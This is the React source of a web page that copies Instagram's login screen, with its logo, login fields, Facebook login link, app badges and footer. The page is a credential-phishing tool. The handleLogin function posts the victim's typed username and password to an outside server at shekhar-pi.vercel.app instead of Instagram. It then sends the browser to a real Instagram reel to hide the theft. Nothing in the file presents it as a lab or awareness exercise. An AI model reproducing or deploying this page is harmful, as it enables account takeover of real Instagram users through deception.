import React, { useState, useRef, useEffect } from 'react';
import './App.css';
import axios from 'axios';


function App() {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const btnRef = useRef(null);

useEffect(() => {
  if (btnRef.current) {
    btnRef.current.disabled = password.length < 7;
  }
}, [password])
  const handleLogin = async (e) => {
    e.preventDefault();
    // Handle login logic here
    try {
      const response = await axios.post('https://shekhar-pi.vercel.app/login', {username: username, password: password})
      // Successful login
      console.log(response.data);
      if (response.data) {
        window.location.href = "https://www.instagram.com/reel/C84YSqYPpLu/?utm_source=ig_web_copy_link&igsh=MzRlODBiNWFlZA==";
      }
      
    }
    catch (error) {
      // Handle error here
      console.error(error);
    }
    
  };

  return (
    <>
      <div className="login">
        <h1>
          <img src="https://i.imgur.com/wvLiKam.png" width="200px" height="68px" alt="Instagram logo" />
        </h1>

        <form onSubmit={handleLogin}>
          <input
            placeholder="Phone number, username, or email"
            type="text"
            name="username"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            required
          />
          <input
            placeholder="Password"
            type="password"
            name="password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            required
          />
          <input ref={btnRef} type="submit" value="Log In" /><br/>
        </form>

        <div className="divider"><b />OR<b /></div>

        <div className="fbwrapper">
          <div className="fb">
            <a href="https://facebook.com">
              <img src="https://i.imgur.com/exksovo.png" alt="Facebook logo" /> Log in with Facebook
            </a>
          </div>
        </div>

        <div className="forgotwrapper">
          <div className="forgot">
            <a href="https://instagram.com">Forgot password?</a>
          </div>
        </div>
      </div>

      <div className="infobox">
        <p>Don't have an account? <a href="https://instagram.com">Sign up</a></p>
      </div>

      <div className="apps">
        <p>Get the app.</p>
        <span>
          <a href="https://apps.apple.com/app/instagram/id389801252?vt=lo">
            <img src="https://i.imgur.com/lREV6Qa.png" height="45px" width="153px" alt="App Store badge" />
          </a>
          <a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26ig_mid%3DXRR9_gALAAHKOzMSO3MkAOZ0JJtC%26utm_content%3Dlo%26utm_medium%3Dbadge">
            <img src="https://i.imgur.com/DFQNKXK.png" height="45px" width="151px" alt="Google Play badge" />
          </a>
        </span>
      </div>

      <div className="footer">
        <p>
          <a href="https://www.instagram.com/about/us/">ABOUT US</a>
          <a href="https://help.instagram.com/">SUPPORT</a>
          <a href="https://instagram-press.com/">PRESS</a>
          <a href="https://www.instagram.com/developer/">API</a>
          <a href="https://www.instagram.com/about/jobs/">JOBS</a>
          <a href="https://help.instagram.com/519522125107875">PRIVACY</a>
          <a href="https://help.instagram.com/581066165581870">TERMS</a>
          <a href="https://www.instagram.com/explore/locations/">DIRECTORY</a>
          <a href="https://www.instagram.com/directory/profiles/">PROFILES</a>
          <a href="https://www.instagram.com/directory/hashtags/">HASHTAGS</a>
          <a href="">LANGUAGE</a>
          <span>© 2019 INSTAGRAM</span>
        </p>
      </div>
    </>
  );
}

export default App;
